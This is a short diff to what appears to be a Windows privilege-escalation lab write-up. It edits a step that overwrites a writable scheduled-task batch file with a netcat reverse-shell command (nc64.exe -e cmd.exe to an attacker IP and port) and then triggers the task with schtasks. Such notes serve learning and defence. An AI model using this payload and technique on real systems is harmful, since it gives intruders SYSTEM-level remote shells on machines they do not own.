@@ -33,12 +33,12 @@ C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
 - Replacing the Contents of the <b style={{ color: 'Plum' }}>.bat</b> File with our <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>
 
 ```log
-C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+C:\> echo c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP $PORT > C:\tasks\schtask.bat
 ```
 
 <br/>
 
-- Starting the <b style={{ color: 'MediumTurquoise' }}>Task</b>. **(In a Normal case Scenario we would have to Wait for the Task to be Started)**
+- Starting the <b style={{ color: 'MediumTurquoise' }}>Task</b> **[In a Normal case Scenario we would have to Wait for the Task to be Started]**
 
 ```log
 C:\> schtasks /run /tn vulntask
